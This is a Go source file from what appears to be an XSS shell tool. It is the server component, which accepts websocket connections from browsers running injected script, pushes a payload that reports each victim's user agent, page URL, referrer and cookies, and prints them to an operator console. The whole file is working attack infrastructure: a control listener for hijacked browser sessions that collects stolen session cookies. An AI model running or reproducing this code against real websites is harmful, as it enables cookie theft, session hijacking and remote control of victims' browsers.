package shell

import (
	//"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/raz-varren/xsshell/shell/payloads"
	"io"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

type shellAckFunc func(sh *Shell, s *socket, h *header, data []byte) error
type ackFunc func(s *socket, h *header, data []byte) error

func shellAck(sh *Shell, sfn shellAckFunc) ackFunc {
	return func(s *socket, h *header, data []byte) error {
		return sfn(sh, s, h, data)
	}
}

//socket management
func (s *Shell) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	ws, err := s.u.Upgrade(w, r, nil)
	if err != nil {
		s.Err(err)
		return
	}

	sock := s.newSocket(ws)
	s.addSocket(sock)
	defer s.removeSocket(sock)
	defer sock.ws.Close()

	err = sock.writeAck(payloads.JSSocketInfo, shellAck(s, setSocketInfo))
	if err != nil {
		s.Err(err)
		return
	}

	for {
		_, res, err := ws.ReadMessage()

		if ignorableError(err) {
			return
		}

		if err != nil {
			s.Err(err)
			return
		}

		err = s.handleResponse(sock, res)
		if err != nil {
			s.Err(err)
			return
		}
	}
}

func (s *Shell) handleResponse(sock *socket, res []byte) error {
	if len(res) < 1 {
		return errors.New("invalid response")
	}

	isErrRes := (HeaderType(res[0]) == HTErr)
	if isErrRes {
		res = res[1:]
	}

	h, p, err := extractHeaderPayload(res)
	if err != nil {
		return err
	}

	switch {
	case isErrRes:
		_, err = s.consoleBufferWrappedErr(sock, h, p)
	case h.ht == HTConsoleOut:
		_, err = s.consoleBufferWrapped(sock, h, p)
	case h.ht == HTAck:
		sock.mu.Lock()
		ack, ok := sock.acks[h.ID()]
		sock.mu.Unlock()

		if !ok {
			err = errors.New("ack ID does not exist on socket")
		} else {
			err = ack(sock, h, p)
		}
	default:
		err = errors.New("invalid header type")
	}

	return err
}

func setSocketInfo(sh *Shell, sock *socket, h *header, data []byte) error {
	info := socketInfo{}
	err := json.Unmarshal(data, &info)
	if err != nil {
		return err
	}
	sock.setInfo(info)
	str := fmt.Sprintf(`socket connected: %s
    user agent: %s 
    page url:   %s 
    referrer:   %s
    cookies:    %s`, sock.id(), info.UserAgent, info.PageURL, info.Referrer, info.Cookies)

	sh.consoleBufferStrWrapped(sock, h, str)

	return nil
}

type socket struct {
	ws         *websocket.Conn
	mu         *sync.RWMutex
	socketID   string
	socketInfo socketInfo
	acks       map[string]ackFunc
}

type socketInfo struct {
	UserAgent string `json:"ua"`
	PageURL   string `json:"pageUrl"`
	Referrer  string `json:"referrer"`
	Cookies   string `json:"cookies"`
}

func (s *socket) id() string {
	return s.socketID
}

func (s *socket) info() socketInfo {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.socketInfo
}

func (s *socket) setInfo(info socketInfo) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.socketInfo = info
}

func (s *socket) write(data []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	p, err := genPayload(HTConsoleOut, data)
	if err != nil {
		return err
	}

	return s.ws.WriteMessage(websocket.TextMessage, p)
}

func (s *socket) writeAck(data []byte, ackfn ackFunc) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	h := newHeader(HTAck)

	p, err := h.genPayload(data)
	if err != nil {
		return err
	}

	err = s.ws.WriteMessage(websocket.TextMessage, p)
	if err != nil {
		return err
	}

	s.acks[h.ID()] = ackfn

	return err
}

func (s *Shell) newSocket(ws *websocket.Conn) *socket {
	s.socketMu.Lock()
	defer s.socketMu.Unlock()
	s.socketInc++
	sock := &socket{
		ws:         ws,
		mu:         &sync.RWMutex{},
		socketID:   strconv.Itoa(s.socketInc),
		socketInfo: socketInfo{},
		acks:       make(map[string]ackFunc),
	}
	return sock
}

func (s *Shell) addSocket(sock *socket) {
	s.socketMu.Lock()
	defer s.socketMu.Unlock()

	s.openSockets[sock.id()] = sock
}

func (s *Shell) removeSocket(sock *socket) {
	s.socketMu.Lock()
	defer s.socketMu.Unlock()

	delete(s.openSockets, sock.id())
	info := sock.info()

	str := fmt.Sprintf(`socket disconnected: %s
    user agent: %s 
    page url:   %s 
    referrer:   %s`, sock.id(), info.UserAgent, info.PageURL, info.Referrer)

	s.consoleBufferStrWrapped(sock, nil, str)
}

//misc
func ignorableError(err error) bool {
	//not an error
	if err == nil {
		return false
	}

	return err == io.EOF || websocket.IsCloseError(err, 1000) || websocket.IsCloseError(err, 1001) || strings.HasSuffix(err.Error(), "use of closed network connection")
}
